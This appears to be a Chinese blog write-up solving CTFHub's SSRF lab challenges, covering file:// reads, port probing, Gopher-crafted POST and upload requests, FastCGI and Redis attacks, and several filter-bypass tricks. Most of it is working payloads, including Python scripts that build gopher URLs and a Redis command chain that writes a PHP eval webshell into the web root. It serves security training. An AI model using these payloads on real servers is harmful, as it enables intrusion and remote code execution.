# 原创
：  CTFHub SSRF

# CTFHub SSRF

#### CTFHub SSRF

## SSRF简介

> 



> 



> 



## 漏洞攻击方式

> 



## CTFHub SSRF靶场

### 第一部分（http、dict和file等协议的利用）

#### 内网访问

> 
题目描述：尝试访问位于127.0.0.1的flag.php吧


> 
Payload


```
http://challenge-eb4649dbccfa6c7d.sandbox.ctfhub.com:10800/?url=http://127.0.0.1/flag.php

```

#### 伪协议读取文件

> 
题目描述：尝试去读取一下Web目录下的flag.php吧


> 
在ssrf中常用的伪协议就是`file:///`协议，其在ssrf中可以用来读取php源码


> 
Payload


```
http://challenge-36595a4428f0685b.sandbox.ctfhub.com:10800/?url=file:///var/www/html/flag.php

```

> 
执行后在源代码中查看flag


#### 端口扫描

> 
题目描述：来来来性感CTFHub在线扫端口，据说端口范围是8000-9000哦,


> 
题给是内网端口扫描，利用ssrf漏洞探测目标主机上还开放了哪些端口，在ssrf中`dict协议`与`http协议`可用来探测内网的主机存活与端口开放情况


> 
用burpsuite抓包来爆破内网的主机存活与端口开放情况，发现8845端口上存在Apache的web服务


> 
Payload


```
http://challenge-86b3590a2c824149.sandbox.ctfhub.com:10800/?url=http://127.0.0.1:8845

```

### 第二部分（Gopher协议的利用）

> 
`Gopher协议`是`HTTP协议`出现之前，在Internet上常见且常用的一个协议，不过现在Gopher协议用得已经越来越少了Gopher协议可以说是ssrf中的万金油，利用此协议可以攻击内网的 Redis、Mysql、FastCGI、Ftp等等，也可以发送 GET、POST 请求，极大拓宽了ssrf的攻击面


#### POST请求

> 
题目描述：这次是发一个HTTP POST请求，对了，ssrf是用php的curl实现的，并且会跟踪302跳转，加油吧骚年


> 
用dirsearch扫描一下：`http://challenge-aa5afefd4daec439.sandbox.ctfhub.com:10800/`


<img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/6c2a6908b7cb4b9eb81ac9491346e2da.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center"/><br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/cd9874c884ce4fe08ca4e8e62a494060.png#pic_center"/>

> 
读index.php的源码


```
http://challenge-aa5afefd4daec439.sandbox.ctfhub.com:10800/?url=file:///var/www/html/index.php

```

```
&lt;?php

error_reporting(0);

if (!isset($_REQUEST['url'])){
    header("Location: /?url=_");
    exit;
}

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $_REQUEST['url']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_exec($ch);
curl_close($ch);

```

> 
读flag.php的源码


```
http://challenge-aa5afefd4daec439.sandbox.ctfhub.com:10800/?url=file:///var/www/html/flag.php

```

```
&lt;?php

error_reporting(0);

if ($_SERVER["REMOTE_ADDR"] != "127.0.0.1") {
    echo "Just View From 127.0.0.1";
    return;
}

$flag=getenv("CTFHUB");
$key = md5($flag);

if (isset($_POST["key"]) &amp;&amp; $_POST["key"] == $key) {
    echo $flag;
    exit;
}
?&gt;

&lt;form action="/flag.php" method="post"&gt;
&lt;input type="text" name="key"&gt;
&lt;!-- Debug: key=&lt;?php echo $key;?&gt;--&gt;
&lt;/form&gt;

```

> 
用Gopher协议构造post请求


```
import urllib.parse
payload =\
"""POST /flag.php HTTP/1.1
Host: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 36

key=c384d200658f258e5b5c681bf0aa29a8
"""  

#注意后面一定要有回车，回车结尾表示http请求结束
tmp = urllib.parse.quote(payload)
new = tmp.replace('%0A','%0D%0A')
result = 'gopher://127.0.0.1:80/'+'_'+new
result = urllib.parse.quote(result)
print(result)       # 这里因为是GET请求所以要进行两次url编码

```

> 
Payload


```
http://challenge-aa5afefd4daec439.sandbox.ctfhub.com:10800/?url=gopher%3A//127.0.0.1%3A80/_POST%2520/flag.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%252036%250D%250A%250D%250Akey%253Dc384d200658f258e5b5c681bf0aa29a8%250D%250A

```

#### 上传文件

> 
题目描述：这次需要上传一个文件到flag.php了，祝你好运


> 
和上一题一样扫描一下web目录，读flag.php的源码


```
http://challenge-0b92a02269b5fb44.sandbox.ctfhub.com:10800/?url=file:///var/www/html/flag.php

```

```
&lt;?php

error_reporting(0);

if($_SERVER["REMOTE_ADDR"] != "127.0.0.1"){
    echo "Just View From 127.0.0.1";
    return;
}

if(isset($_FILES["file"]) &amp;&amp; $_FILES["file"]["size"] &gt; 0){
    echo getenv("CTFHUB");
    exit;
}
?&gt;

Upload Webshell

&lt;form action="/flag.php" method="post" enctype="multipart/form-data"&gt;
    &lt;input type="file" name="file"&gt;
&lt;/form&gt;

```

> 
可以发现flag.php确实是个文件上传的页面，且仅要求上传的文件大小大于0即可得到flag，并没有任何过滤，尝试利用gopher协议上传文件


> 
随便上传一个非空的文件，然后抓包，利用脚本构造Payload


<img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/f87c632797dc4415bf8f976fc6c5c6bb.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center"/><br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/ab0d56158e3b44d59fc57546ed42b7a4.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center"/>

```
import urllib.parse
payload =\
"""POST /flag.php HTTP/1.1
Host: 127.0.0.1
Content-Length: 281
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://challenge-0b92a02269b5fb44.sandbox.ctfhub.com:10800
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryP1tAFG8gw3Q8NTg6
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://challenge-0b92a02269b5fb44.sandbox.ctfhub.com:10800/?url=file:///var/www/html/flag.php
Accept-Encoding: gzip, deflate
Accept-Language: en-CN,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,en-US;q=0.6
Connection: close

------WebKitFormBoundaryP1tAFG8gw3Q8NTg6
Content-Disposition: form-data; name="file"; filename="1.txt"
Content-Type: text/plain

111
------WebKitFormBoundaryP1tAFG8gw3Q8NTg6
Content-Disposition: form-data; name="submit"

鎻愪氦
------WebKitFormBoundaryP1tAFG8gw3Q8NTg6--
"""  

#注意后面一定要有回车，回车结尾表示http请求结束
tmp = urllib.parse.quote(payload)
new = tmp.replace('%0A','%0D%0A')
result = 'gopher://127.0.0.1:80/'+'_'+new
result = urllib.parse.quote(result)
print(result)       # 这里因为是GET请求所以要进行两次url编码

```

> 
Payload


```
http://challenge-0b92a02269b5fb44.sandbox.ctfhub.com:10800/?url=gopher%3A//127.0.0.1%3A80/_POST%2520/flag.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Length%253A%2520281%250D%250ACache-Control%253A%2520max-age%253D0%250D%250AUpgrade-Insecure-Requests%253A%25201%250D%250AOrigin%253A%2520http%253A//challenge-0b92a02269b5fb44.sandbox.ctfhub.com%253A10800%250D%250AContent-Type%253A%2520multipart/form-data%253B%2520boundary%253D----WebKitFormBoundaryP1tAFG8gw3Q8NTg6%250D%250AUser-Agent%253A%2520Mozilla/5.0%2520%2528Windows%2520NT%252010.0%253B%2520Win64%253B%2520x64%2529%2520AppleWebKit/537.36%2520%2528KHTML%252C%2520like%2520Gecko%2529%2520Chrome/92.0.4515.131%2520Safari/537.36%250D%250AAccept%253A%2520text/html%252Capplication/xhtml%252Bxml%252Capplication/xml%253Bq%253D0.9%252Cimage/avif%252Cimage/webp%252Cimage/apng%252C%252A/%252A%253Bq%253D0.8%252Capplication/signed-exchange%253Bv%253Db3%253Bq%253D0.9%250D%250AReferer%253A%2520http%253A//challenge-0b92a02269b5fb44.sandbox.ctfhub.com%253A10800/%253Furl%253Dfile%253A///var/www/html/flag.php%250D%250AAccept-Encoding%253A%2520gzip%252C%2520deflate%250D%250AAccept-Language%253A%2520en-CN%252Cen%253Bq%253D0.9%252Czh-CN%253Bq%253D0.8%252Czh%253Bq%253D0.7%252Cen-US%253Bq%253D0.6%250D%250AConnection%253A%2520close%250D%250A%250D%250A------WebKitFormBoundaryP1tAFG8gw3Q8NTg6%250D%250AContent-Disposition%253A%2520form-data%253B%2520name%253D%2522file%2522%253B%2520filename%253D%25221.txt%2522%250D%250AContent-Type%253A%2520text/plain%250D%250A%250D%250A111%250D%250A------WebKitFormBoundaryP1tAFG8gw3Q8NTg6%250D%250AContent-Disposition%253A%2520form-data%253B%2520name%253D%2522submit%2522%250D%250A%250D%250A%25E9%258E%25BB%25E6%2584%25AA%25E6%25B0%25A6%250D%250A------WebKitFormBoundaryP1tAFG8gw3Q8NTg6--%250D%250A

```

#### FastCGI协议

> 
题目描述：这次，我们需要攻击一下fastcgi协议咯，也许附件的文章会对你有点帮助


> 
FastCGI：



> 
php-fpm



> 
php-fpm攻击实现原理



> 
使用[Gopherus工具](https://github.com/tarunkant/Gopherus)生成攻击FastCGI的payload


> 
利用条件：



> 
然后进行二次编码后将最终的payload内容放到?url=后面发送过去（这里需要进行两次编码，因为这里GET会进行一次解码，curl也会再进行一次解码）


> 
用蚁剑连接webshell


<img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/1e42159f5ced4f54bcef0a969d161682.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center"/><br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/58b062c928fb455fbeb44cb294c06a29.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center"/>

#### Redis协议

> 
题目描述：这次来攻击redis协议吧，redis://127.0.0.1:6379,，资料？没有资料！自己找！


> 
利用SSRF对目标主机上的Redis进行未授权访问攻击，探测一下目标主机开启的端口，在6379端口发现Redis的报错


> 
利用未授权访问攻击Redis的方法有很多，可以写webshell、反弹shell，也可以写ssh公钥，这里采用写webshell的方法<br/> 构造redis命令


```
flushall
set 1 '&lt;?php eval($_POST["whoami"]);?&gt;'
config set dir /var/www/html
config set dbfilename shell.php
save

```

```
import urllib.parse
protocol="gopher://"
ip="127.0.0.1"
port="6379"
shell="\n\n&lt;?php eval($_POST[\"whoami\"]);?&gt;\n\n"
filename="shell.php"
path="/var/www/html"
passwd=""
cmd=["flushall",
"set 1 {}".format(shell.replace(" ","${IFS}")),
"config set dir {}".format(path),
"config set dbfilename {}".format(filename),
"save"
]
if passwd:
    cmd.insert(0,"AUTH {}".format(passwd))
payload=protocol+ip+":"+port+"/_"
def redis_format(arr):
    CRLF="\r\n"
    redis_arr = arr.split(" ")
    cmd=""
    cmd+="*"+str(len(redis_arr))
    for x in redis_arr:
        cmd+=CRLF+"$"+str(len((x.replace("${IFS}"," "))))+CRLF+x.replace("${IFS}"," ")
        cmd+=CRLF
    return cmd

if __name__=="__main__":
    for x in cmd:
        payload += urllib.parse.quote(redis_format(x))
    print(urllib.parse.quote(payload))    # 由于我们这里是GET，所以要进行两次url编码

```

> 
Payload


```
http://challenge-4729e7001fe71c25.sandbox.ctfhub.com:10800/?url=gopher%3A//127.0.0.1%3A6379/_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252435%250D%250A%250A%250A%253C%253Fphp%2520eval%2528%2524_POST%255B%2522whoami%2522%255D%2529%253B%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A/var/www/html%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25249%250D%250Ashell.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A

```

### 第三部分（Bypass）

#### URL Bypass

> 
题目描述：请求的URL中必须包含http://notfound.ctfhub.com，来尝试利用URL的一些特殊地方绕过这个限制吧


> 
题目说url必须以 `http://notfound.ctfhub.com` 开头，我们可以利用`@`来绕过，如 `http://whoami@127.0.0.1`实际上是以用户名 `whoami` 连接到站点`127.0.0.1`，即 `http://notfound.ctfhub.com@127.0.0.1`与 `http://127.0.0.1`请求是相同的，该请求得到的内容都是`127.0.0.1`的内容


> 
Payload


```
http://challenge-c47ec8d53b1d2c1b.sandbox.ctfhub.com:10800/?url=http://notfound.ctfhub.com@127.0.0.1/flag.php

```

#### 数字IP Bypass

> 
题目描述：这次ban掉了127以及172，不能使用点分十进制的IP了，但是又要访问127.0.0.1，该怎么办呢


> 



```
&lt;?php
$ip = '127.0.0.1';
$ip = explode('.',$ip);
$r = ($ip[0] &lt;&lt; 24) | ($ip[1] &lt;&lt; 16) | ($ip[2] &lt;&lt; 8) | $ip[3] ;
if($r &lt; 0) {
$r += 4294967296;
}
echo "十进制:";
echo $r;
echo "八进制:";
echo decoct($r);
echo "十六进制:";
echo dechex($r);
?&gt;

```

```
十进制:2130706433    八进制:0177.0.0.1    十六进制:0x7f.0.0.1

```

> 



```
http://localhost/
http://0/
http://[0:0:0:0:0:ffff:127.0.0.1]/
http://①②⑦.⓪.⓪.①

```

#### 302跳转 Bypass

> 
题目描述：SSRF中有个很重要的一点是请求可能会跟随302跳转，尝试利用这个来绕过对IP的检测访问到位于127.0.0.1的flag.php吧


> 
方法一：在网络上存在一个很神奇的服务，网址为`http://xip.io`，当访问这个服务的任意子域名的时候，都会重定向到这个子域名，例如访问 `http://127.0.0.1.xip.io/flag.php`，实际上访问的就是`http://127.0.0.1/flag.php`


```
http://0.xip.io/flag.php
http://localhost.xip.io/flag.php
http://①②⑦.⓪.⓪.①.xip.io/flag.php

```

> 
方法二：利用短地址跳转绕过，[https://4m.cn/](https://4m.cn/)<br/> 直接使用生成的短连接`https://4m.cn/FjOdQ`就会自动302跳转到`http://127.0.0.1/flag.php`上，这样就可以绕过WAF了


#### DNS重绑定 Bypass

> 
题目描述：关键词：DNS重绑定。剩下的自己来吧，也许附件中的链接能有些帮助


> 
对于常见的IP限制，后端服务器可能通过下图的流程进行IP过滤


> 



> 



> 



> 



> 
Payload


```
http://challenge-f273b5d6478c655e.sandbox.ctfhub.com:10800/?url=7f000001.2f653948.rbndr.us/flag.php

```
